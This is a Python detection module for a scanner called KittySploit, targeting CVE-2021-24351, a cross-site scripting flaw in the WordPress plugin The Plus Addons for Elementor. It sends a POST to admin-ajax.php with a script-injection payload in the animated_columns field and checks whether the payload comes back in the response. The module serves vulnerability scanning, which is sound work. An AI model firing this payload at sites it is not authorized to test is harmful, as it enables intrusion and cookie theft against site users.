#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress The Plus Addons for Elementor plugin before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress The Plus Addons for Elementor <4.1.12 - Cross-Site Scripting Detection',
        'description': 'WordPress The Plus Addons for Elementor plugin before 4.1.12 is susceptible to cross-site scripting. The plugin does not properly sanitize some of its fields in the heplus_more_post AJAX action, which is exploitable by both unauthenticated and authenticated users. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve2021',
            'cve',
            'wordpress',
            'wp-plugin',
            'wp',
            'xss',
            'the-plus-addons-for-elementor',
            'wpscan',
            'posimyth',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/2ee62f85-7aea-4b7d-8b2d-5d86d9fb8016',
            'https://theplusaddons.com/changelog/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24351',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/JoshMorrison99/my-nuceli-templates',
        ],
        'cve': 'CVE-2021-24351',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=theplus_more_post&post_type=any&posts_per_page=10&offset=0&display_button=yes&post_load=products&animated_columns=test%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'the-plus-addons-for-elementor',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress The Plus Addons for Elementor <4.1.12 - Cross-Site Scripting detected', path=path)
            return True
        return False

